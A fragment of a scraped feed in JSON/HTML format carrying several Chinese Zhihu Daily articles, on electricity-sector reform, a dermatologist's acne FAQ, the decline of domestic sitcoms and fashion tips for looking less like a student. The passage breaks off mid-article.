href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68037"},{"title":"为什么要进行电力体制改革？","date":"2021-08-01 23:08:26","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-afb3a99a54665caabf2679592ea582c9_l.jpg?source=8673f162\"><span>文刀，</span><span>电力圈的伪文艺青年</span>\n<a href=\"https://www.zhihu.com/question/39110435/answer/408624029\" hidden>阅读原文</a>\n</div>\n<div>\n<p>题主对问题的描述略显偏颇，电力体制改革可不仅仅是针对电网，2015 年 3 月的中发 9 号文《关于进一步深化电力体制改革的若干意见（中发〔2015〕9 号）文》为新一轮电改定调，同年 11 月的六个配套文件，是指明改革着手点的关键，包括：</p>\n<ul>\n<li>《关于推进输配电价改革的实施意见》</li>\n<li>《关于推进电力市场建设的实施意见》</li>\n<li>《关于电力交易机构组建和规范运行的实施意见》</li>\n<li>《关于有序放开发用电计划的实施意见》</li>\n<li>《关于推进售电侧改革的实施意见》</li>\n<li>《关于加强和规范燃煤自备电厂监督管理的指导意见》</li>\n</ul>\n<p>所以，电力体制改革是针对包括发电、输配电、售电、用电的整体电力系统，电网只是其中一环。同时由于电能是生活生产的重要二次能源，且对物理设备依赖性强，所以电网的物理垄断性不会被完全打破，针对电网改革的是其管辖范围（剥离电网的交易机构，使是电网更回归输配电本职），以及其运营和盈利方式（通过输配电价改革核定其收费）。</p>\n<p>正视了电改之后，回到问题主体，为什么进行电改？把这个问题再进一步细化成下面这三个问题，答案就明晰了：</p>\n<ol>\n<li><strong>市场化机制的本质意义？——宏观价值</strong></li>\n<li><strong>电力系统为什么要从计划体制转向市场体制？——改革目标</strong></li>\n<li><strong>是什么促使政府走出了这一步？——根本动因</strong></li>\n</ol>\n<p><strong>一、市场化改革的宏观意义</strong></p>\n<p>与市场体制相应对的就是计划体制，市场更强调利益和价值驱动，通过高效的市场行为提高整体的市场价值，降本与增效并重。从定义上看，</p>\n<blockquote>市场机制主要是由市场的供求变化，通过竞争的方式引起价格、利率、汇率等上下自由波动，来引导资源向更加有效、更加合理的方向流动，实现全社会资源的优化配置。</blockquote>\n<p>市场改革的意义，笼统地讲，就是<strong>资源优化配置</strong>。通俗地讲，市场就是把买方和卖方汇聚在一起，互相交易并决定商品的价格和产量，解决生产什么、由谁生产、如何生产的问题，并通过这种博弈与决策行为，提高经济效率，并且最大化可实现的社会福利。</p>\n<p>在买方与卖方交易的过程中，稀缺的资源占有更大的价值空间，稀缺的极致就是垄断。垄断方在市场行为中具备了一家独大的定价权，另一方则只能为被动接受者。如果卖方垄断，则因无竞争者，可肆意抬价；反之，垄断的买方则可以无底线的压价。</p>\n<p>回到电改，2002 年的前一轮电改实现了“厂网分离”，发电厂形成了多卖方的结构，而电网对于发电厂而言是单一买方，可以尽量压价，对于用户又是单一卖方，可以抬价，所以赚得盆满钵满。而此次输配电网改革对电网营利模式的改革，抑或是售电侧改革对售电市场的培训，都在为形成多买方的格局。此次电改的思路是<strong>“管住中间，放开两头”</strong>，就是控制电网的收益，形成多买多卖的发用竞争格局，为市场化博弈和竞争做好市场结构建设，为长远的资源优化配置创造基本条件。</p>\n<p><strong>二、电力体制改革的实际目标</strong></p>\n<p>资源优化配置是一个很宏观的概念，针对电力体制进行改革，一定也有需要切实解决的实际目标。这部分在中发九号文中给出了答案，挑重点记录如下：</p>\n<ul>\n<li>一是交易机制缺失，资源利用效率不高。</li>\n<li>二是价格关系没有理顺，市场化定价机制尚未完全形成。</li>\n<li>三是政府职能转变不到位，各类规划协调机制不完善。</li>\n<li>四是发展机制不健全，新能源和可再生能源开发利用面临困难。</li>\n<li>五是立法修法工作相对滞后，制约电力市场化和健康发展。</li>\n</ul>\n<p>以上很宏观？不知道在说啥？我们对照着逐条重新翻译一下。</p>\n<ul>\n<li>以前定计划，资源利用好不好政府说了算，以后市场化竞争，谁强谁上，该淘汰的就淘汰。</li>\n<li>政府定价有延迟，不能及时反应供需变化及实际成本，由市场定价则是竞争博弈的直接成果，更为合理和及时。</li>\n<li>电力规划和协调应以市场资源的稀缺价值为引导，市场将成为引导合理规划和高效投资的新指向标。</li>\n<li>新能源不能盲目开发扩建，需要以适应市场为目标，合理规则、布局、开发，促进良性发展。</li>\n<li>建立完善的法律法规和规范，使市场执行有法可行，有据可依。</li>\n</ul>\n<p>总体而言，就是要通过市场化改革，<strong>提高能源的生产和利用效率，形成合理的交易价格，提高发输配电资本的利用效率，正确地引导电力规划</strong>。</p>\n<p><strong>三、政府推行改革的出发点</strong></p>\n<p>从电改目标更向本源去追溯问题，以上问题不进行改革，依靠计划体制就实现不了吗？</p>\n<p>实际上，国际上许多国家都进行过电力改革，不少国家也已经形成了特色鲜明的电力市场机制。纵观各国推行改革的时机，都有一个共同点——<strong>供大于求，产能过剩</strong>！</p>\n<p><em>为什么这样的背景下需要推行改革呢？</em><strong>养的“孩子”太多，是时候让他们自立更生了。</strong></p>\n<p>供大于求，也就是说发电方产能太多，有电卖不出。计划制的含义是，统一制定计划，发电厂按照计划执行即可。作为制定者，不仅仅要单纯的满足电力的供需平衡，还要对各发电厂要“管饱”，即在兼顾发电厂间利益均衡的前提下还要保证发电厂的总体收益。近些年，用电需求的增长远不如发电增长地快，随着产能过剩的加剧，通过计划来满足发电厂的利益诉求越发困难。于是，最好的选择就是放弃计划机制，将发电厂放入到市场的大池子中，交由市场机制通过竞争和博弈来自行争取利益空间，“八仙过海，各显神通”，谁行谁上。</p>\n<p>将发电厂推向市场，看似残忍，但其实恰恰就是这种竞争，才能促使发电厂从被动接受计划转变为主动提高竞争实力，真正带动产业的整体升级和进步。</p>\n<p>与此同时，改革有风险，执行需谨慎，在电力过剩条件下进行改革，多买的格局可以达成降电价的效果，容易获得各界的支持，改革更容易成功。</p>\n<p>相关问题推荐：</p>\n<p><a href=\"https://www.zhihu.com/question/61919785/answer/199311682\">新一轮电力体制改革为何进展缓慢？</a><a href=\"https://www.zhihu.com/question/59607673/answer/169487663\">寻求电力市场方向入门建议？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/39110435\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738753"},{"title":"痤疮真的治不好吗？","date":"2021-08-01 23:08:19","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-d8dad077fd5f910750853600cf195b17_l.jpg?source=8673f162\"><span>皮肤科杨希川教授，</span><span>三甲公立医院皮肤科主任医师</span>\n<a href=\"https://www.zhihu.com/question/57272725/answer/2020270670\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>必知：痤疮攻略及问题大全</strong></p>\n<p>痤疮是青年人最常见的皮肤病，俗称青春痘、粉刺、暗疮等。痤疮尽管一般不影响健康，但影响容颜，使人自卑，继而严重影响患者的心理健康、学习生活、社会交往和就业选择。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-623c2e2938ecb3fffd48f67c53d9f2dc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>痤疮原因</strong></strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4e3025334c53f646db8e05c54cb43123_720w.png?source=8673f162\" alt=\"\"></figure><p>痤疮的毛囊皮脂腺炎症的发生与多种因素有关，如内分泌因素、毛囊口角化异常、毛囊内的细菌过度生长以及遗传因素。</p>\n<p>尽管痤疮与内分泌关系密切，多数情况下痤疮患者体内雄激素水平是正常的，并不需要检查内分泌（性激素），但如果女性经常月经量少、延后，特别是有多毛和肥胖，则需要查性激素排除高雄激素血症，特别是多囊卵巢综合征。特殊情况下还需要排除先天性肾上腺皮质增生以及肾上腺或卵巢肿瘤。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa4ad383de0dfd7071cbb5428c8a127c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>痤疮的特点</strong></strong></p>\n<p>主要发生于额部、两颊、胸背上部这些皮脂分泌较多的部位。表现为粉刺、红色丘疹、小脓疱，严重的可发生暗红色硬结或囊肿。部份患者愈合后遗留瘢痕。一般分为轻度、中度、重度。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c3c1e1c592d19d977c8fcff5652dfcc7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>如何治疗</strong></strong><strong><strong>1.内服药：</strong></strong></p>\n<p>①维甲酸类，如异维 A 酸或维胺脂；②抗生素，如四环素、多西环素等；③性激素，如达英 -35，优思明等；④抗雄性激素，如螺内酯、丹参酮胶囊等。</p>\n<p>注意：女性患者服用维甲酸类药物，应注意避孕，异维 A 酸需要停药 3 个月、维胺酯需停药半年以上才能怀孕。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fabb28a0938a9da2126fba980d0a6b47_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>2.外用药：</strong></strong></p>\n<p>①维甲酸类，如阿达帕林凝胶等；②过氧化苯甲酰凝胶；③抗生素，如克林霉素、夫西地酸等；④二硫化硒洗剂，可以配合用于洁净皮肤。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ab09b078ba78b9d3aca8bf6703eee7ec_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>一些新的治疗：</strong></strong></p>\n<p>①红蓝光，对炎症丘疹效果好。②果酸活肤，对丘疹及粉刺有较好的疗效。③光动力，适合结节囊肿型痤疮。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4720e0116d0f30fa54d9ebf28d6a401e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>如何选择治疗方法：</strong></strong></p>\n<p>痤疮治疗药物种类很多，需要根据病情严重程度选用治疗方法。</p>\n<p><strong>轻度痤疮：</strong>可以外用药为主，必要时配合口服药。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-6e139032dd2a9f5fb498b635d13c281a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>中度痤疮：</strong>可内服抗生素类、维甲酸类药物；皮损处外搽维甲酸类、过氧化苯甲酰或克林霉素等。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0e72bcd2887cd793dbaccba670058fe3_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>重度痤疮：</strong>有较多丘疹、脓疱及硬结或囊肿等，首选内服维甲酸类，可配合其他口服药。局部外搽过氧化苯甲酰、抗生素类或维甲酸类药膏。对重度痤疮，光动力治疗效果很好。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c97ab4bff80d1b83e178cd9361aa809d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>光动力治疗前后</strong></p>\n<p><strong><strong>痤疮常见问题</strong></strong></p>\n<p>问；</p>\n<blockquote>是不是青春期才长痘痘？</blockquote>\n<p>答；</p>\n<blockquote>因为约 85%的青少年长过痤疮，所以痤疮俗称“青春痘”，尽管痤疮多数在 25 岁前开始缓解，但它并不是年轻人的专利，其多发的年龄有两个阶段：一是青春期，另一个是 30、40 岁左右。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-2f368d5a0607f381cd165467cf279564_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>痤疮多久能好？</blockquote>\n<p>答；</p>\n<blockquote>虽然痤疮会随年龄自发缓解，但是有些患者痤疮可达多年，有研究表明成人女性痤疮患者平均发病年龄为 16 岁，痤疮病程平均 20 年，所以适当的治疗控制和必要的预防是需要的。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-382aef02c75cf5f3a8e0efe779906a23_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>痤疮是内分泌紊乱引起的吗？<br>是否应该做内分泌方面的检查？</blockquote>\n<p>答；</p>\n<blockquote>痤疮的发生与雄激素密切相关，而且 83%的女性在月经前 1 周左右皮损加重，但多数人血中的性激素是正常的，只是局部毛囊皮脂腺对雄激素更敏感或局部雄激素合成转换增加，所以不需要常规做内分泌方面的检查。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-aa0633db25337ed0891e026223d8cf9f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>什么情况下需要做内分泌方面检查？</blockquote>\n<p>答；</p>\n<blockquote>尽管多数痤疮患者性激素水平正常，不需要做内分泌方面检查，但确实有少数人痤疮与内分泌紊乱有关，如果女性出现月经量少、月经周期延长、多毛、脱发等，则需要化验性激素等排除高雄激素血症。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-2a44278f388519e4955cf2eb7f5c2f83_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>痤疮是细菌引起的吗？<br>是因为手接触了细菌没有洗手又摸脸引起的吗？</blockquote>\n<p>答；</p>\n<blockquote>痤疮的发病与痤疮丙酸杆菌、糠秕马拉色菌有关。这些微生物多数平时就存在于毛囊中，只是在适合的条件下引起痤疮。与一般的外界接触细菌无关，所谓的手带细菌造成痤疮没有依据。</blockquote>\n<figure><img src=\"https://pica.zhimg.com/v2-a93e13f12ed45ccd17f1489e03eb4864_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>化妆品会引起痤疮吗？</blockquote>\n<p>答；</p>\n<blockquote>由化妆品或美发产品引起的痤疮分别称为“化妆品痤疮”和“润发油痤疮”，是由于其中的成分堵塞毛孔或刺激毛囊皮脂腺角化而引起，多数表现为闭合性粉刺，严重者可出现炎性丘疹，因此一些化妆品有可能引起或加重痤疮。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-9db668a51e943c2d5c12c6b120ccebfa_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>吸烟会加重痤疮吗？</blockquote>\n<p>答；</p>\n<blockquote>吸烟会引起或加重粉刺，可能因为尼古丁能促进皮脂分泌和毛囊皮脂腺的角化。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-b9834abd8aa60e557db831d11e05b964_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>那么诱发痤疮的主要因素是什么呢？</blockquote>\n<p>答；</p>\n<blockquote>一些饮食和生活习惯是痤疮的重要诱发因素，如油腻、甜食、牛奶、饮酒、生活不规律、精神紧张均可加重或诱发痤疮。辣椒对痤疮的影响不确定，有些人有影响，有些人没有影响。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-f3057b16bcce45c5f24b32d20ee8ca0b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>注意生活和饮食习惯后是否就会自愈？</blockquote>\n<p>答；</p>\n<blockquote>不一定，因为痤疮的原因非常复杂，生活和饮食习惯只是其中的诱发因素，轻微的痤疮注意后可能会自愈，但严重的则需要配合外用药、口服药物、红蓝光、光动力治疗等。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-aea37b09ee5e5b1c384b4b81aec8ab88_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问;</p>\n<blockquote>痤疮可以吃鱼、虾、海鲜吗？</blockquote>\n<p>答;</p>\n<blockquote>尽管痤疮患者应注意少吃辛辣油腻甜食，但没必要过度忌口，均衡的营养对痤疮的预防和治疗是有好处的。鱼、虾、海鲜等这些所谓的“发物”对痤疮没有影响，不需要忌口。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-f6039f75ff4761b295cbf625eae949aa_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>医生给我开了四环素？我牙齿会变黄吗？</blockquote>\n<p>答；</p>\n<blockquote>四环素类药物(包括米诺环素、多西环素等)药物会引起“生长期”牙齿变黄(四环素牙)，所以 8 岁以下儿童禁用。如果你的牙齿已经过了“生长期”，就可以用。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-8669eb9300cb4e8b126a94a949ff6e1e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>我正在备孕或怀孕期间，痤疮怎么治疗？</blockquote>\n<p>答；</p>\n<blockquote>在备孕和怀孕期间应以外用药为主，但应避免外用维甲酸类药物，可以局部外用克林霉素、红霉素、壬二酸，严重时可口服红霉素。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-23c5c028d1b3b7e51417028dbcb7eab2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>可以“挑痘痘”或“挤痘痘”吗？</blockquote>\n<p>答；</p>\n<blockquote>尽量避免自己“挤痘”或随便“挑痘”，有可能会因挤压形成二次损伤，加重炎症，更容易留下瘢痕。可以到医院皮肤科用专用的粉刺针和粉刺挤压器进行治疗，治疗后应注意清洁和防晒。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-29636b612c7f2adbd38f52e03155adb5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>痤疮是否能根治？</blockquote>\n<p>答；</p>\n<blockquote>痤疮可以很好的控制和缓解，注意饮食和生活习惯也可减少或避免复发，但并不能绝对根治，好在多数人随年龄自愈。尽管不能绝对根治，还是建议早期治疗，以避免留下永久性痘印和痘疤而影响美观。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-f2f3888eacc90cc49685a7dd4be19717_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>为什么我的痤疮治疗效果不好？</blockquote>\n<p>答；</p>\n<blockquote>经常有患者抱怨治疗无效。有可能确实是治疗方法不当、药物不敏感、伴有高雄激素血症等，但最常见的原因还是没有坚持用够疗程，在药物起效之前已经停药。</blockquote>\n<figure><img src=\"https://pica.zhimg.com/v2-c4d482b61849551dcccdaf2c4e290e77_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问；</p>\n<blockquote>怀孕后痤疮会好吗？<br>经常有女性朋友说“生了孩子痤疮就会好”，这个说法可靠吗？</blockquote>\n<p>答；</p>\n<blockquote>不一定，在妊娠期，痤疮可以改善、不变或加重。产后也是一样的，但总体随年龄多数会逐渐减轻。尽管如此，仍有女性发病至 40 岁以后。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-35c4e06cccdf078f9252c039bb2b5b45_720w.jpg?source=8673f162\" alt=\"\"></figure><p>问：</p>\n<blockquote>脸上有很多痘印，怎么办？<br>吃酱油会加深痘印吗？</blockquote>\n<p>答：</p>\n<blockquote>如果只是色沉，多数随时间会变淡或消失，但凹凸不平的痘疤则一般不能完全消退，对长期不消的色素沉着及痘疤可以激光、磨削及果酸治疗，外用水杨酸、壬二酸或维甲酸也有一定帮助。吃酱油不会引起痘印变深，因为酱油中的色素即不参与皮肤色素的合成，也不沉积于皮肤。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-9d60b1fad50ea32db740cbac157b0359_720w.jpg?source=8673f162\" alt=\"\"></figure><p>保持无瑕、健康的面容，是我们从容面对生活，自信应对挑战的前提！只要青春不要痘，祝大家早日战痘成功！</p>\n<p>〔免责声明〕</p>\n<p>本文数据更新于 2021 年 07 月 26 日</p>\n<p>由「皮肤科杨希川教授」原创，旨在为读者进行科普</p>\n<p>科普内容不能代替医生诊治意见，仅供参考</p>\n<p>如有皮肤问题，请及时咨询医生</p>\n<p>部分图片来源网络，如有侵权请联系删除</p>\n<p>封面图源：涛涛</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/57272725\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738743"},{"title":"为什么国内现在不拍情景喜剧了？","date":"2021-08-01 23:08:10","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-7debcff8fae0b52ca3a0640207261b45_l.jpg?source=8673f162\"><span>郑远，</span><span>编剧/导演 编剧讲师 剧本医生（工作/创作/学习请私信）</span>\n<a href=\"https://www.zhihu.com/question/475960848/answer/2028612499\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>题外话：</strong></p>\n<p>最早入行做的第一部剧就是情景喜剧（2014）。</p>\n<p>前期策划虽然没有参与，但从修改剧本、现场副导到后期剪辑、配乐配音效，到审片出片、看它上线（播放尚可、口碑豆瓣 5.9 分），近乎埋头苦干。在后期公司剪辑房睡了二个月，也是颇有趣和意义的经历。</p>\n<p>此项目之后也陆续做了些情景喜剧相关的项目——拍了 2 集的情景喜剧样片、至少参与 3 部情景喜剧的策划——无一例外全部黄掉。最近三年都没有接触到任何情景喜剧项目。</p>\n<p>这并不奇怪，下文我将会解释：我们为什么要跟情景喜剧说再见了？</p>\n<p>我对情景喜剧是有感情的，小学看过《我爱我家》《成长的烦恼》《家有儿女》《东北一家人》《编辑部的故事》《炊事班的故事》《都市男女》《人人都爱雷蒙德》。</p>\n<p>高中看了《武林外传》和美国的《好汉两个半》，大学英语老师课上让我们看《生活大爆炸》，后来陆续看了《破产姐妹》《老爸老妈浪漫史》。</p>\n<p>从开始做情景喜剧开始，接触到一些经典情景喜剧，比如《布莱克书店》《米兰达》《IT 狂人》《歪星撞地球》《费城阳光永远灿烂》。我用 iPad 播放《歪星撞地球》助眠，十分有效。</p>\n<p>不久后新式情景喜剧占领市场，比较经典的是《罗马三贱客》《硅谷》《废柴舅舅》《男追女》《摩登家庭》《办公室》。除此之外，还有大量的看了几眼就舍弃的情景喜剧（老式、新式都有），题材有理发店、医院、公寓等等。</p>\n<p>知名度非常高的《老友记》和《爱情公寓》我没怎么看。若不是对这个问题的调查，这这几年的国产情景喜剧，比如《有些室友不能碰》《哈哈健身房》《能耐大了》，我近乎都没看过。</p>\n<p>小学看剧通过电视、初高中开始电脑和电池使用量持平、大学开始全是电脑，而当下用的最多的设备是手机（并非用手机看情景喜剧）。</p>\n<p><strong>一、市场趋势</strong></p>\n<p>情景喜剧从产品角度看，是以小博大的项目。《爱情公寓》第一季的投资成本是 300 万，到第四季时，一集卖到 500 万。典型的成功案例。</p>\n<p>从内容角度看，情景喜剧内容轻松、笑点密集；一集 20 分钟左右 / 集的时长；非连续剧情也符合观众碎片化的观影需求。</p>\n<p>但需要注意，<strong>情景喜剧的上述优势已成过去</strong>。</p>\n<p>对于喜剧的需求，目前国内观众的焦点已转移到新领域“短视频”和老牌“综艺”领域。</p>\n<p>从生活经验看，刷几分钟笑不起来的情景喜剧还不如刷短视频的乐趣多。短视频依靠兴趣算法，牢牢抓住受众的时间。何况，男性看点搞笑短视频时还能刷出小姐姐；女性还能刷出美妆和小哥哥。短视频从曾经的 3 秒抓住兴趣到现在第一帧抓住观众兴趣。</p>\n<p><strong>快餐文化已经变成“一眼文化”，不能再稀碎了。</strong></p>\n<p>综艺的优势在于内容策划、明星流量和轻松观感，牢牢抓住女性受众。大部分综艺投资体量远远超过情景喜剧。质量当然也超过情景喜剧。</p>\n<p>情景喜剧的生存空间大大缩小，以我的判断，它的市占率不足 0.5%。</p>\n<p><strong>不只是国内缺乏情景喜剧，国外也再难有出色的情景喜剧（传统和新式）</strong>。除了早已家喻户晓的系列情景剧外，新的情景喜剧也难以出名。</p>\n<p>国外喜剧类产品更多的是脱口秀和《黑人兄弟》《周六夜现场》这样的产品。国内前几年也有这样的风潮，比如《80 后脱口秀》和《今夜百乐门》，以及一直以来大量的喜剧类选秀节目，比如《笑傲江湖》《欢乐喜剧人》等。</p>\n<p><strong>情景喜剧不再讨喜，并非讨不到观众的喜，而是讨不到资本的喜。</strong>单条短视频的成本也许就 500 元，单集情景剧怎么也得 20 来万。</p>\n<p>三年前平台就明确表示不会投资情景喜剧，这几年看到的国产情景喜剧，大多走分账。</p>\n<p><strong>二、不争气从业者</strong></p>\n<p>这个小标题相当打脸，不过作为从业者也得面对不争的现实。</p>\n<p>这两天我所浏览到的情景喜剧，还是带罐头笑声的传统情景喜剧，没有一部是新式的。因此<strong>在情景喜剧的类型摸索上，从业者止步不前</strong>。</p>\n<p>《办公室》（The Office）以模拟纪录风格增加喜剧感；《男追女》以融合奇幻元素增加喜感；《硅谷》以黑色幽默立足。这些情景喜剧均抛弃了传统的罐头笑声。</p>\n<p>《爱情公寓》以海派情景喜剧的标签立足，除了强化青年 + 都市感（故事内容）外，在运镜上用大量的、连贯的摇、甩、推、拉，以连续性画面强化喜剧冲突，这种探索也有别于传统情景喜剧的生切。</p>\n<p>《爱情公寓》的掌镜者需要记住 8 个角色的台词先后顺序，以在角色讲话时，准确地捕捉到画面并有节奏地推、拉。《爱情公寓》前后有 4 个摄影师，经过大量练习才掌握此技能，可以说，熟练这种运镜方式的全中国也只有这四位。</p>\n<p>我认为，《爱情公寓》对情景喜剧的画面风格上做出了有益的尝试。</p>\n<p>但至今，<strong>新式情景喜剧在国内仍然是空白</strong>，但在韩国市场，新式情景喜剧做的风生水起，比如二年前的爆款《加油威基基》。我仍然记得，当《威基基》爆红后，至少有五个制片说要做同类型产品（当然，至今我还没看到）。</p>\n<p>在情景喜剧探索上，二年前我和制片合作一部日式喜剧风格的《奔跑的克拉》。爱奇艺剧本评测给的分还可以，但模式依然走分账。做了完整剧本后也接触了不少资方，无疾而终。</p>\n<p>情景喜剧变得越来越不值当——市场需求弱、策划难做、剧本难写、喜剧人才匮乏（演员 + 制作团队）——如果国内再产生爆款情景喜剧，我一定送上鲜花。</p>\n<p>整个情景喜剧市场，太需要一款爆款情景喜剧来提振信心。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/475960848\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738741"},{"title":"怎么快速脱掉学生气？","date":"2021-08-01 23:08:04","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-2865da76f020f7c80620b2d50034b572_l.jpg?source=8673f162\"><span>三个桃，</span><span>超实用系时尚穿搭博主，来【公众号：三个桃】找我吧！</span>\n<a href=\"https://www.zhihu.com/question/20142619/answer/410756831\" hidden>阅读原文</a>\n</div>\n<div>\n<p>事先声明的是——</p>\n<p><strong>今天大部分是桃子穿衣示范，示范图以讲清方法为主，所以都是比较常见的基本款，目的是让大家容易上手、好操作。</strong></p>\n<p><strong><strong>一，摆脱路人甲，鞋子很重要！！！</strong></strong></p>\n<p>生活中我们常说的<strong>学生气重</strong>，<strong>（长）T 恤 + 牛仔裤 + 运动鞋大概是标配。</strong></p>\n<p>按照标配穿了一身！示范的标准吗？</p>\n<p>（右图加上了帅气的机车夹克，也依然没帅起来……）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-90302e6d74a7997b448965a5775f6fa0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>之前桃子在推送里说过，差不多的一身搭配，<strong>鞋子定义整体风格</strong>。</p>\n<p>所以，想要改变风格，从鞋子下手。</p>\n<p><strong>把帆布鞋 / 运动鞋换成成熟向的高跟鞋</strong>，有没有立刻觉得大不同？</p>\n<p>同时，注意<strong>两个细节</strong>，时髦度会 up——</p>\n<p><strong>1，</strong>上衣塞到裤子里；<strong>2，</strong>卷裤边（多露一点点脚踝）</p>\n<p>（有关细节，后面我会详细说）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-dd86ea7f8208bc37966e378289a7d41f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>穿不惯高跟鞋，或者觉得细高跟太成熟，怎么办？</p>\n<p>桃子也有推荐——</p>\n<p>一直很流行的<strong>圆头粗中跟</strong>就很适合，好走路，风格又不会太犀利，我觉得 20+ 都能驾驭。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c62f7d6f527ab9ec586e6b6cab00f994_720w.jpg?source=8673f162\" alt=\"\"></figure><p>烦恼学生气的妹子们，很建议你们买这种圆头中跟鞋。</p>\n<p>它的另外一个好处是，<strong>脚背露出比较多</strong>，比起全包脚面的帆布鞋、运动鞋，<strong>修饰腿型</strong>的作用非常明显——</p>\n<p>能让腿部线条更流畅，腿看起来更长。</p>\n<p>（对比一下，包脚的款式阻断了腿部的视觉延伸，所以看起来腿就短一些）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fcfebef1b8ec73ac71c67689ec5a9a9b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还推荐初入职场的女生穿。</p>\n<p>最左边是上学时，很多妹子常穿的<strong>牛津鞋</strong>，最适合走学院风。但职场穿，鞋头圆乎乎，有点笨拙。</p>\n<p>右边是尖头高跟鞋，风格最干练，气场也最强。如果担心 Hold 不住，中间的圆头粗跟最适合职场新人。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-92d97cc3143fcb5f7acb0c1af4488fc1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>好，继续来看，夏天很多人穿的<strong>T 恤衫 + 牛仔裤</strong>组合。</p>\n<p>读者 Jojo.Yyh 说的大概就是这个意思，没什么不好，可……确实很路人。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4970f75e874620921ef6467790e3d090_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还是从鞋子下手。</p>\n<p><strong>第一双——</strong></p>\n<p>考虑到很多年轻妹子嫌太高的高跟鞋，成熟感过强（也不好走路）。</p>\n<p>所以，桃子特意挑了一双没那么高跟，还有点小可爱的<strong>黑白格子凉鞋</strong>，不会太成熟咯~~</p>\n<p>有了可爱向的凉鞋加持，也是充满青春气息，但就没那么学生气。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b8695fed5428f6d196ea908eaadd4161_720w.jpg?source=8673f162\" 